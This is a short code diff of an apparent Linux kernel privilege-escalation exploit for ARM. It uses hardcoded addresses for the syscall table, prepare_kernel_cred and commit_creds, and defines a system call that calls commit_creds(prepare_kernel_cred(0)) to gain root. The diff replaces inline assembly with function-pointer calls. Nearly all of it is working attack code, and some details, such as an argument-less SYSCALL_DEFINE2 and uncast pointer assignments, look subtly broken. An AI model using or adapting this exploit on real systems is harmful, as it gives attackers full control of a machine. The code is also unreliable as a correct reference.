@@ -1,5 +1,4 @@
 #include <sys/syscall.h>
-#include <linux/kernel.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -8,16 +7,14 @@
 #define SYS_UPPER 223
 #define SYS_CALL_TABLE 0x8000e348
 
-long commit_creds = 0x8003f56c;
-long prepare_kernel_creds = 0x8003f924;
+int (*commit_creds)(unsigned long cred);
+unsigned long (*prepare_kernel_cred)(unsigned long cred);
 
 SYSCALL_DEFINE2() {
-    // volatile keyword idicates that the instuctions has important side-effects.
-    asm volatile (
-        "eor r0, r0\n"
-        "bl prepare_kernel_creds\n"
-        "bl commit_creds\n"
-    );
+    prepare_kernel_cred = 0x8003f924;
+    commit_creds = 0x8003f56c;
+    // privileges escelation to root
+    commit_creds(prepare_kernel_cred(0));    
     return 0;  
 }
 
